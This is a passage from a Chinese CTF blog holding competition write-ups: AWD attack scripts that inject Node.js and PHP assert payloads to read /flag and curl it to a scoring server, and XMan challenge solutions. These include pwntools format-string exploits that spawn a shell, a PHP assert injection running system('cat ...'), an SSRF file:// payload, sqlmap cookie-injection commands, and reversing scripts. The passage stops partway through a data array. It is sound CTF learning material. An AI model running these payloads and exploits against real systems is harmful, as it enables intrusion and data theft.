f&quot;http://172.16.{i+1}.101:20001/category/test?0=%28function%28%29%7b%0a%20%20%20%20var%20fs%20%3d%20require%28%27fs%27%29%3b%0a%09var%20flag%20%3d%20fs.readFileSync%28%27%2fflag%27%2c%20%27utf-8%27%29%3b%0a%09fs.writeFileSync%28%27%2fhome%2fxctf%2fweb%2fstatic%2fjs%2ftest.js%27%2c%20flag%29%3b%0a%09return%201%3b%0a%7d%29%28%29%3b&quot;    try:        get(url)        url = f&quot;http://172.16.{i+1}.101:20001/static/js/test.js&quot;        flag = get(url).text        flag = get(url).text[:-1]        system(f&#39;curl http://172.16.200.20:9000/submit_flag/ -d &quot;flag={flag}&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD&quot;&#39;)        print(f&quot;\n{flag}&quot;)    except:        pass</code></pre><pre><code class="python">from requests import postfrom pyquery import PyQuery as pqfrom os import systemfor i in range(24):    if i == 8:        continue    print(f&quot;======{i+1} starts=======&quot;)    if i == 12 or i == 2:        continue    payloads = [        &quot;@assert($_POST[cmd])&quot;,        &quot;@assert($_POST[cmd])&quot;,        &quot;@call_user_func(assert, $_POST[cmd])&quot;,        &quot;print(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)))&quot;    ]    for p in payloads:        url = &quot;http://172.16.&quot; + str(i+1) + &quot;.102:20002/?r=list&amp;pages=123{${&quot; + p + &quot;}}123&quot;        t = post(url, data={&#39;cmd&#39; : &#39;system(&quot;/bin/cat /flag&quot;);&#39;}).text        try:            d = pq(t)            out = d(&#39;.pagecode&#39;).html()            print(out)            flag = out.split(&#39;;&#39;)[-2].split(&#39;\n&#39;)[1]            if i==16:                flag = flag[2:]            print(f&quot;{i+1} : {flag}&quot;)            system(f&#39;curl http://172.16.200.20:9000/submit_flag/ -d &quot;flag={flag}&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD&quot;&#39;)            print(&#39;\n&#39;)        except:            print(f&quot;{i+1} not avai&quot;)            pass</code></pre><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>全场贡献只有成功 patch 了最容易的第二题。</p><h2 id="once-time"><a href="#once-time" class="headerlink" title="once_time"></a>once_time</h2><p>checksec：</p><pre><code class="shell">[*] &#39;/home/assassinq/Desktop/once_time&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>拖进 ida，main 函数：</p><pre><code class="cpp">unsigned __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char s; // [rsp+0h] [rbp-20h]  char v5; // [rsp+8h] [rbp-18h]  unsigned __int64 v6; // [rsp+18h] [rbp-8h]  v6 = __readfsqword(0x28u);  setbuf();  printf(&quot;input your name: &quot;, a2);  memset(&amp;s, 0, 9uLL);  read(0, &amp;s, 9uLL);  v5 = 0;  printf(&quot;wellcome :%s\n&quot;, &amp;s);  return vul();}</code></pre><p>另一个关键函数：</p><pre><code class="cpp">unsigned __int64 vul(){  char s; // [rsp+0h] [rbp-20h]  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(&quot;leave a msg: &quot;);  memset(&amp;s, 0, 0x10uLL);  read(0, &amp;s, 0x20uLL);  if ( strstr(&amp;s, &quot;%p&quot;) || strstr(&amp;s, &quot;$p&quot;) )  {    puts(&quot;do you want to leak info?&quot;);    exit(0);  }  printf(&amp;s, &quot;$p&quot;);  return __readfsqword(0x28u) ^ v2;}</code></pre><p><code>vul()</code> 中 <code>read(0, &amp;s, 0x20uLL);</code> 处存在 <code>buffer overflow</code>，又因为开了 Canary，需要想办法绕过；<code>printf(&amp;s, &quot;$p&quot;);</code> 处存在 <code>format string</code>，可以实现任意地址的读和写。</p><ol><li>首先将 <code>__stack_chk_fail</code> 的 got 表改成 main 函数的地址，那么这样每次栈溢出报错的时候就会再一次执行 main 函数，从而实现多次输入，可以多次利用 <code>printf(&amp;s，&quot;$p&quot;);</code> 进行格式化字符串攻击；</li><li>泄漏 libc 的基址，这里用泄漏 read 函数的真实地址来实现；</li><li>将 one_gadget 写入 <code>exit()</code> 函数的 got 表中。</li></ol><pre><code class="gdb">0008| 0x7fffffffdc10 (&quot;BBBBBBBB\n&quot;) ; 第二次输入0016| 0x7fffffffdc18 --&gt; 0xa (&#39;\n&#39;)0024| 0x7fffffffdc20 --&gt; 0x00032| 0x7fffffffdc28 --&gt; 0x8e2d258951a854000040| 0x7fffffffdc30 --&gt; 0x7fffffffdc60 --&gt; 0x400a20 (push   r15)0048| 0x7fffffffdc38 --&gt; 0x400a08 (mov    rcx,QWORD PTR [rbp-0x8])0056| 0x7fffffffdc40 (&quot;AAAAAAAA&quot;) ; 第一次输入</code></pre><p>调试出来可以看到第一次输入位于第二次输入后的第六个参数，64 位下偏移就是 12。为了达到触发 <code>__stack_chk_fail</code> 的目的，我们还需要覆盖掉 Canary，位于第二次输入后的第三个参数处，故至少需要输入大于 24 个字符。read 总共读 0x20 个字符，我们这里也就读 0x20 个，以触发 <code>__stack_chk_fail</code>。</p><p>第二步利用 <code>read</code> 的 got 表将 libc 基址泄漏出来。然后在已知 libc 版本的情况下，第三步将 <code>exit</code> 的 got 表覆盖成 one_gadget。最后送个 <code>%p</code> 或者 <code>$p</code> 上去 getshell。exp 如下：</p><pre><code class="python">#!/usr/bin/env python#coding=utf-8from pwn import *# context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;p = process(&#39;./once_time&#39;)elf = ELF(&#39;./once_time&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)one_gadget_offset = 0xf1147info(&#39;&gt;&gt;&gt; REPLACE __stack_chk_fail WITH main &lt;&lt;&lt;&#39;)main = 0x400983stack_chk_fail_got = elf.got[&#39;__stack_chk_fail&#39;]p.recvuntil(&#39;input your name: &#39;)p.sendline(p64(stack_chk_fail_got))p.recvuntil(&#39;leave a msg: &#39;)payload = &#39;%{}c%12$n&#39;.format(str(main))payload = payload.ljust(0x20, &#39;\x00&#39;)print repr(payload)p.send(payload)info(&#39;&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;&#39;)read_got = elf.got[&#39;read&#39;]p.recvuntil(&#39;input your name: &#39;)p.sendline(p64(read_got))p.recvuntil(&#39;leave a msg: &#39;)payload = &#39;%12$s&#39;payload = payload.ljust(0x20, &#39;\x00&#39;)print repr(payload)p.send(payload)data = p.recvuntil(&#39;\x7f&#39;)print u64(data[-6:].ljust(8, &#39;\x00&#39;))read_offset = libc.symbols[&#39;read&#39;]libc_base = u64(data[:6].ljust(8, &#39;\x00&#39;)) - read_offset# libc.address = read - read_offsetsuccess(&#39;libc_base = &#39; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetsuccess(&#39;one_gadget = &#39; + hex(one_gadget))info(&#39;&gt;&gt;&gt; FMTSTR ATTACK &lt;&lt;&lt;&#39;)info(&#39;FIRST WORD&#39;)info(hex(one_gadget &amp; 0xFFFF))exit_got = elf.got[&#39;exit&#39;]p.recvuntil(&#39;input your name: &#39;)p.sendline(p64(exit_got))p.recvuntil(&#39;leave a msg: &#39;)payload = &#39;%{}c%12$hn&#39;.format(str(one_gadget &amp; 0xFFFF))#取最低的双字节并对齐payload = payload.ljust(0x20, &#39;\x00&#39;)print repr(payload)p.send(payload)info(&#39;SECOND WORD&#39;)info(hex((one_gadget &gt;&gt; 16) &amp; 0xFFFF))p.recvuntil(&#39;input your name: &#39;)p.sendline(p64(exit_got + 2))p.recvuntil(&#39;leave a msg: &#39;)payload = &#39;%{}c%12$hn&#39;.format(str((one_gadget &gt;&gt; 16) &amp; 0xFFFF))payload = payload.ljust(0x20, &#39;\x00&#39;)print repr(payload)p.send(payload)info(&#39;THIRD WORD&#39;)info(hex((one_gadget &gt;&gt; 32) &amp; 0xFFFF))p.recvuntil(&#39;input your name: &#39;)p.sendline(p64(exit_got + 4))p.recvuntil(&#39;leave a msg: &#39;)payload = &#39;%{}c%12$hn&#39;.format(str((one_gadget &gt;&gt; 32) &amp; 0xFFFF))payload = payload.ljust(0x20, &#39;\x00&#39;)print repr(payload)p.send(payload)info(&#39;FOURTH WORD&#39;)info(hex((one_gadget &gt;&gt; 48) &amp; 0xFFFF))p.recvuntil(&#39;input your name: &#39;)p.sendline(p64(exit_got + 6))p.recvuntil(&#39;leave a msg: &#39;)if (one_gadget &gt;&gt; 48) &amp; 0xFFFF != 0:    payload = &#39;%{}c%12$hn&#39;.format(str((one_gadget &gt;&gt; 48) &amp; 0xFFFF))else:    payload = &#39;%12$hn&#39;payload = payload.ljust(0x20, &#39;\x00&#39;)print repr(payload)p.send(payload)p.recvuntil(&#39;input your name: &#39;)p.sendline(&#39;root&#39;)p.recvuntil(&#39;leave a msg: &#39;)p.sendline(&#39;%p&#39;)p.recvuntil(&#39;\n&#39;)success(&#39;&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;&#39;)p.interactive()</code></pre><h2 id="messageboard"><a href="#messageboard" class="headerlink" title="messageboard"></a>messageboard</h2><p>这题大佬们都用堆做，然而我一点都不会。后来神仙 pizza 给了一种 <code>format string</code> 的超简单做法。</p><pre><code class="shell">[*] &#39;/home/assassinq/Desktop/messageboard&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>拖进 ida 里，典型的堆题的形式，这里只看第四个选项：</p><pre><code class="cpp">unsigned __int64 getshell(){  int fd; // ST04_4  __int64 v2; // [rsp+8h] [rbp-58h]  __int128 v3; // [rsp+28h] [rbp-38h]  __int64 *v4; // [rsp+38h] [rbp-28h]  char *v5; // [rsp+40h] [rbp-20h]  __int64 (__fastcall *v6)(_QWORD, _QWORD); // [rsp+48h] [rbp-18h]  unsigned __int64 v7; // [rsp+58h] [rbp-8h]  v7 = __readfsqword(0x28u);  printf(&quot;guess a number:&quot;);  v3 = 0uLL;  v5 = command;  v6 = (__int64 (__fastcall *)(_QWORD, _QWORD))((char *)getshell + 317);  readline((__int64)nptr, 0x18u);  fd = open(&quot;/dev/random&quot;, 0);  read(fd, &amp;v3, 2uLL);  read(fd, (char *)&amp;v3 + 8, 2uLL);  v2 = atoi(nptr);  v4 = &amp;v2;  sleep(1u);  printf(&quot;you guess &quot;, (char *)&amp;v3 + 8);  printf(nptr);  printf(&quot; the answer is %lld \n&quot;, (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1));  if ( *v4 != (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1) )  {    puts(&quot;GG!&quot;);    exit(0);  }  system(command);  return __readfsqword(0x28u) ^ v7;}</code></pre><p>可以看到这里让我们猜测一个系统产生的随机数，猜对了就能 getshell。再来看看 pizza 的 exp：</p><pre><code class="python">from pwn import *p = process(&#39;./messageboard&#39;)p.recvuntil(&#39;choice &gt;&gt;&#39;)p.sendline(&#39;4&#39;)p.recvuntil(&#39;guess a number:&#39;)payload = &#39;%2$*11$s%2$*12$s%13$n&#39;p.sendline(payload)p.interactive()</code></pre><p>关于 <code>*</code>：宽度与精度格式化参数可以忽略，或者直接指定，或者用星号 <code>*</code> 表示取对应函数参数的值。例如 <code>printf(&quot;%*d&quot;, 5, 10)</code> 输出 <code>10</code>；<code>printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)</code> 输出 <code>abc</code>。</p><p>由此可知，第十一位和第十二位参数上存放的是随机数，第十三位则是我们的输入，这里将随机数的值写入我们的输入，达到 getshell 的目的。</p><p>堆的做法以后再来复现。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>比赛打下来，发现实力是重要的一部分，同时经验、技巧（猥琐发育）以及运气都是重要的因素。希望下次有更多的机会参与线下 AWD 比赛。</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.jianshu.com/p/b8e448951125" target="_blank" rel="noopener">https://www.jianshu.com/p/b8e448951125</a><br><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018-XMan个人排位赛</title>
    <link href="/2018/08/11/2018-XMan%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9B/"/>
    <url>/2018/08/11/2018-XMan%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>唉 pwn 还是没有入门。</p><a id="more"></a><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h2><p>用 <code>DiskGenius</code> 恢复磁盘：</p><p><img src="/pics/2018-XMan个人排位赛/1.png" srcset="/img/loading.gif" alt></p><h2 id="XMAN-通行证"><a href="#XMAN-通行证" class="headerlink" title="XMAN 通行证"></a>XMAN 通行证</h2><p>不同的网站解密结果竟然不一样。最后发现这个<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">网站</a>还行。</p><pre><code>a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==</code></pre><p>第一眼就知道先是 base64：</p><pre><code>kanbbrgghjl{zb____}vtlaln</code></pre><p>栅栏 7 栏加密：</p><pre><code>kzna{blnl_abj_lbh_trg_vg}</code></pre><p>凯撒位移 13 位得到 flag：</p><pre><code>xman{oyay_now_you_get_it}</code></pre><h2 id="PPAP"><a href="#PPAP" class="headerlink" title="PPAP"></a>PPAP</h2><p>用 wireshark 打开，搜索关键字 flag，很容易找到一串 base64：</p><p><img src="/pics/2018-XMan个人排位赛/2.png" srcset="/img/loading.gif" alt></p><p>经过分析以后，具体结构应该是这样的：</p><pre><code>yaaaaaaaar, land ho!    Hey wesley, you got that flag?Ayy, I got yer files right here, matey!            [base64&#39;d jpg]            [base64&#39;d flag.zip]And here be the map to the booty!            [base64&#39;d Haar cascade]    I don&#39;t understand, this isn&#39;t even a ma-Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50!Lastly, if ye sail the seven seas, you do be a pirate!</code></pre><p>jpg 文件和 zip 文件之间通过等号判断分隔。通过 python 得到三个文件：</p><pre><code class="python"># exampleimport base64f1 = open(&#39;b1&#39;, &#39;r&#39;)enc1 = f1.read()f2 = open(&#39;b1.jpg&#39;, &#39;w&#39;)out = base64.b64decode(enc1)f2.write(out)f1.close()f2.close()</code></pre><p><img src="/pics/2018-XMan个人排位赛/3.png" srcset="/img/loading.gif" alt></p><p>然后又通过 binwalk 发现，这里输出的 jpg 图片其实不止一张。用 foremost 输出所有的图片。</p><p>下面用了官方的脚本，用 opencv 找出数百张图片的其中一张来得到密码：</p><pre><code class="python">import osimport sysimport cv2# Get all of the picturesimgs = os.listdir(&#39;jpg&#39;)# Cascade we&#39;ll be using for detectioncascade = cv2.CascadeClassifier(&#39;b3.xml&#39;)# From the cluesscaling_factor = 1.02min_neighbors = 10  # Bumped this up until one pic was leftfor img_name in imgs:    # Load the image and run the cascade    img = cv2.imread(os.path.join(&#39;jpg&#39;, img_name))    detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors)    if len(detect) &gt; 0:        for (x, y, w, h) in detect:            # X marks the spot!            cv2.line(img, (x, y),     (x + w, y + h), (255, 0, 0), 2)            cv2.line(img, (x, y + h), (x + w, y),     (255, 0, 0), 2)        # Save the new image        cv2.imwrite(os.path.join(&#39;detected&#39;, img_name), img)</code></pre><p>最后得到一张海盗的图片，容易知道密码应该是 skullandcrossbones，得到 flag。</p><h2 id="AUTOKEY"><a href="#AUTOKEY" class="headerlink" title="AUTOKEY"></a>AUTOKEY</h2><p>一个 pcap 包，都是 usb 流量，通过 <code>tshark</code> 提取出来：</p><pre><code class="shell"> ⚡ root@kali  ~/Desktop  tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; usbdata.txtRunning as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.</code></pre><p>查看后发现都是八个字节的数据，那么应该是键盘流量，用脚本跑出来：</p><pre><code class="python">#!/usr/bin/env python#-*- coding:utf-8 -*-mappings = { 0x04:&quot;A&quot;,  0x05:&quot;B&quot;,  0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;,  0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;,  0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;,  0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;,  0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\n&quot;, 0x2a:&quot;[DEL]&quot;,  0X2B:&quot;    &quot;, 0x2C:&quot; &quot;,  0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;,  0x30:&quot;]&quot;,  0x31:&quot;\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;,  0x34:&quot;&#39;&quot;, 0x36:&quot;,&quot;,  0x37:&quot;.&quot; }nums = []keys = open(&#39;usbdata.txt&#39;)for line in keys:    if line[0]!=&#39;0&#39; or line[1]!=&#39;0&#39; or line[2]!=&#39;0&#39; or line[3]!=&#39;0&#39; or line[6]!=&#39;0&#39; or line[7]!=&#39;0&#39; or line[8]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[11]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[14]!=&#39;0&#39; or line[15]!=&#39;0&#39;:        continue    nums.append(int(line[4:6],16))print numskeys.close()output = &quot;&quot;for n in nums:    if n == 0 :        continue    if n in mappings:        output += mappings[n]    else:        output += &#39;[unknown]&#39;print &#39;output :\n&#39; + output</code></pre><p>出来的结果：</p><pre><code>output :[unknown]A[unknown]UTOKEY&#39;&#39;.DECIPHER&#39;[unknown]MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ&#39;</code></pre><p>去掉 <code>[uuknown]</code>，<code>[DEL]</code> 则是去掉后一个字符，得到：</p><pre><code>output :AUTOKEY&#39;&#39;.DECIPHER&#39;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXOZEZ&#39;</code></pre><p>百度一下 autokey，用 github 上找到的的<a href="https://github.com/Ezran/crypto/blob/master/break_autokey/break_autokey.py" target="_blank" rel="noopener">爆破脚本</a>得到 flag。</p><p><img src="/pics/2018-XMan个人排位赛/4.png" srcset="/img/loading.gif" alt></p><pre><code>-676.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLFHELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT I HIDE IN THE KEYBOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF</code></pre><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SIMPLE-SSRF"><a href="#SIMPLE-SSRF" class="headerlink" title="SIMPLE SSRF"></a>SIMPLE SSRF</h2><p>hint 里提示 <code>curl</code> 还有 <code>flag在/etc/flag.txt</code>，大概是通过 file 协议读取本地文件。payload：</p><pre><code>file://www.baidu.com/etc/flag.txt#</code></pre><h2 id="MAKEIT"><a href="#MAKEIT" class="headerlink" title="MAKEIT"></a>MAKEIT</h2><p>网页上提示了 git，猜测存在 <code>.git</code> 文件泄露，把源码下载下来之后审计：</p><pre><code class="php">&lt;?phpif (isset($_GET[&#39;page&#39;])) {    $page = $_GET[&#39;page&#39;];} else {    $page = &quot;home&quot;;}$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &#39;..&#39; is dangerous!assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);?&gt;</code></pre><p>这里有 <code>assert()</code>，可以执行函数中的命令，通过构造闭合前面的 <code>strpos()</code> 绕过，来得到 <code>templates/flag.php</code> 中的内容：</p><pre><code>1&#39;, &#39;..&#39;) or system(&#39;cat templates/flag.php&#39;); //</code></pre><h2 id="BBSQLI"><a href="#BBSQLI" class="headerlink" title="BBSQLI"></a>BBSQLI</h2><p>cookie 注入，PHPSESSID 拿下来：</p><p><img src="/pics/2018-XMan个人排位赛/5.png" srcset="/img/loading.gif" alt></p><p>用 sqlmap 跑：</p><pre><code class="shell">// 跑表名python sqlmap.py -u http://202.112.51.184:16080/ --cookie &quot;PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49&quot; --table --level 2// 跑列名python sqlmap.py -u http://202.112.51.184:16080/ --cookie &quot;PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49&quot; --columns -T &#39;[GDJM_flag]&#39; --level 2// 跑flagpython sqlmap.py -u http://202.112.51.184:16080/ --cookie &quot;PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49&quot; --dump -T &#39;[GDJM_flag]&#39; -C &#39;flag&#39; --level 2</code></pre><p>PS：不同的 level 等级，SQLMAP 所采用的策略也不近相同，当–level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当–level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="DRAGON-QUEST"><a href="#DRAGON-QUEST" class="headerlink" title="DRAGON QUEST"></a>DRAGON QUEST</h2><p>和 csaw 的那道 wyvern 很像，可以用 angr 跑出来：</p><pre><code class="python">#!/usr/bin/env pythonimport angrimport claripyp = angr.Project(&#39;task_xman1&#39;)flag_chars = [claripy.BVS(&#39;flag_%d&#39; % i, 8) for i in range(28)] # flag&#39;s length is 28, every char is 8 bitflag = claripy.Concat(*flag_chars + [claripy.BVV(b&#39;\n&#39;)]) # end with &#39;\n&#39;st = p.factory.full_init_state(        args=[&#39;./xman_task1&#39;], # arguments        add_options=angr.options.unicorn,        stdin=flag, # flag as input)for k in flag_chars:    st.solver.add(k != 0) # char is not 0    st.solver.add(k != 10) # char is not &#39;\n&#39;sm = p.factory.simulation_manager(st)sm.run()out = b&#39;&#39;for pp in sm.deadended:    out = pp.posix.dumps(1)    if b&#39;flag{&#39; in out:        out = next(filter(lambda s: b&#39;flag{&#39; in s, out.split()))        breakprint(&#39;flag:&#39;, out)</code></pre><p>pizza 大佬提供了另一种思路。先用 ida-python 去混淆：</p><pre><code class="python">import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytesdef do_patch(ea):    if(get_bytes(ea, 1) == &quot;\x8B&quot;): # mov eax-edi, dword        reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) &gt;&gt; 3        patch_bytes(ea, chr(0xB8 + reg) + &quot;\x00\x00\x00\x00\x90\x90&quot;)    elif(get_bytes(ea, 2) == &quot;\x44\x8B&quot;): # mov r8d-r15d, dword        reg = (ord(get_bytes(ea + 2, 1)) &amp; 0b00111000) &gt;&gt; 3        patch_bytes(ea + 1, chr(0xB8 + reg) + &quot;\x00\x00\x00\x00\x90\x90&quot;)for addr in xrange(0x610318, 0x6105AC, 4):    ref = ida_xref.get_first_dref_to(addr)    print(hex(addr).center(20,&quot;-&quot;))    while(ref != ida_idaapi.BADADDR):        do_patch(ref)        print(&quot;patch at &quot; + hex(ref))        ref = ida_xref.get_next_dref_to(addr, ref)    print(&quot;-&quot;*20)</code></pre><p>最后脚本：</p><pre><code class="python">secret = [100, 214, 266, 369, 417, 527, 622, 733, 847, 942, 1054, 1106, 1222, 1336, 1441, 1540, 1589, 1686, 1796, 1891, 1996, 2112, 2165, 2260, 2336, 2412, 2498, 2575]n = 0flag = &quot;&quot;for i in xrange(0, len(secret)):    ch = secret[i] - n    n += ch    flag += chr(ch)print(flag)</code></pre><h2 id="EASYWASM"><a href="#EASYWASM" class="headerlink" title="EASYWASM"></a>EASYWASM</h2><p>github 上找到一个<a href="https://github.com/WebAssembly/wabt" target="_blank" rel="noopener">将 wasm 转成 c 的工具</a>。命令：<code>wasm2c easywasm.wasm -o easywasm.c</code></p><p>大概内容：</p><pre><code class="cpp">...static void init_globals(void) {  g2 = 0u;  g3 = 0u;  _flag_enc = 0u;  _k = 1104u;  _r = 1360u;}...static void _md5(u32 p0, u32 p1, u32 p2) {  ...}static u32 _check(u32 p0) {  ...}...static void init_memory(void) {  memcpy(&amp;((*Z_envZ_memory).data[(*Z_envZ_memoryBaseZ_i)]), data_segment_data_0, 1648);}static void init_table(void) {  ...}static void init_exports(void) {  ...}void WASM_RT_ADD_PREFIX(init)(void) {  init_func_types();  init_globals();  init_memory();  init_table();  init_exports();}</code></pre><p>转换成 c 代码后，审计起来还是很累。硬逆出来：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibdata = [0x35, 0x36, 0x32, 0x66, 0x65, 0x33, 0x63, 0x63, 0x35, 0x30, 0x30, 0x31,  0x34, 0x63, 0x32, 0x36, 0x30, 0x64, 0x39, 0x65, 0x38, 0x63, 0x66, 0x34,  0x65, 0x64, 0x33, 0x38, 0x63, 0x37, 0x37, 0x61, 0x00, 0x63, 0x30, 0x32,  0x32, 0x61, 0x64, 0x30, 0x63, 0x63, 0x30, 0x30, 0x37, 0x35, 0x61, 0x39,  0x61, 0x62, 0x31, 0x34, 0x62, 0x34, 0x31, 0x32, 0x61, 0x31, 0x30, 0x38,  0x32, 0x64, 0x35, 0x66, 0x33, 0x00, 0x36, 0x34, 0x63, 0x32, 0x38, 0x36,  0x63, 0x66, 0x63, 0x36, 0x32, 0x33, 0x61, 0x61, 0x38, 0x64, 0x37, 0x64,  0x66, 0x37, 0x63, 0x30, 0x38, 0x38, 0x65, 0x62, 0x66, 0x37, 0x64, 0x37,  0x31, 0x38, 0x00, 0x38, 0x33, 0x36, 0x36, 0x34, 0x62, 0x64, 0x65, 0x65,  0x34, 0x62, 0x36, 0x31, 0x33, 0x62, 0x37, 0x65, 0x37, 0x61, 0x35, 0x31,  0x62, 0x35, 0x32, 0x31, 0x33, 0x34, 0x37, 0x30, 0x61, 0x38, 0x64, 0x00,  0x62, 0x30, 0x32, 0x30, 0x62, 0x66, 0x35, 0x39, 0x38, 0x61, 0x61, 0x61,  0x32, 0x62, 0x33, 0x65, 0x30, 0x33, 0x65, 0x64, 0x30, 0x32, 0x63, 0x38,  0x35, 0x34, 0x33, 0x36, 0x32, 0x36, 0x38, 0x61, 0x00, 0x34, 0x66, 0x64,  0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39,  0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30,  0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35,  0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31,  0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39,  0x65, 0x64, 0x00, 0x63, 0x32, 0x33, 0x31, 0x64, 0x36, 0x30, 0x37, 0x62,  0x36, 0x38, 0x32, 0x33, 0x66, 0x64, 0x30, 0x61, 0x36, 0x38, 0x65, 0x38,  0x31, 0x33, 0x37, 0x36, 0x30, 0x38, 0x30, 0x39, 0x37, 0x35, 0x34, 0x00,  0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37,  0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36,  0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30,  0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38,  0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 